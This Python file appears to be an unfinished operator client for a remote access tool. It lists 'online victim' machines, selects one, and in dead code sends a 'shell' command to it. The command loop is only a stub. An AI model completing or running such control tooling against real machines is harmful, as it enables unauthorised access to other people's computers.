import json
import socket
import ssl
import sys

import tools.message as message
import tools.my_socket as my_socket

VERSION = 0.1

PROMPT:str = "->"

class client_prompt:
    def __init__(self, sock:my_socket.my_socket):
        self.socket = sock
        self.mode:str = None # shell, file upload/download...
        self.victim_hostname:str = None
        self.victim_version:int = None
        self.server_version:int = None
        self.prompt_input:str = str()

    def _open_connection(self):
        msg = self.socket.recv_msg()
        self.server_version = msg.status_code
        victim_list:list = msg.msg["victim_list"]
        print("Server: " + str(self.server_version))
        print("online victim list:")
        for i in range(len(victim_list)):
            print(str(i) + ". " + victim_list[i])
        
        

        # getting the response from the server - if the victim was selected successfully or not found
        # repeating the victim selection until we picked a valid victim
        while True:
            self.prompt_input = input(PROMPT)
            msg = {
                "victim_selection": self.prompt_input,
                "version": VERSION,
                "status_code": 0,
                "status_msg": ""
            }
            self.socket.send_msg(json.dumps(msg, indent=None))

            msg = self.socket.recv_msg()
            if msg.status_code == 0: # we picked a valid victim
                self.victim_hostname = msg.msg["victim_hostname"]
                self.victim_version = msg.msg["victim_version"]
                print(msg.status_msg)
                break
            else:
                print(msg.status_msg)


    def handle_prompt(self):
        # the loop of the commands
        self.close_connection()
        return

        while True:
            pass

    def handle(self):
        self._open_connection()
        self.handle_prompt()

    def close_connection(self):
        self.socket.close()

    def handle_connection(self):
        pass
        

if __name__ == "__main__":
    conn = socket.create_connection(("localhost",9090))
    m_socket = my_socket.my_socket(conn)
    cl_prompt = client_prompt(m_socket)
    cl_prompt.handle()
    
    

    exit(0)
    
    try:
        msg = m_socket.recv_msg()
        print(F"recieved: {msg}")
        with open("recv.json", "w") as file:
            file.write(str(msg))
            file.close()
    except BrokenPipeError as err:
        print(F"error recveiving data: {str(err)}", file=sys.stderr)
    except Exception as err:
        print(F"UNEXPECTED ERROR: {str(err)}", file=sys.stderr)

    msg = message.message(F"""{{
        "command": "shell",
    "command_attr": {{
    }}
    }}""")
    if not m_socket.send_msg(msg):
        print("failed to send the message")
    
    print("closing now the socket")
    if not m_socket.close(): print("failed to close the socket properly", file=sys.stderr)
    else:
        print("socket closed")
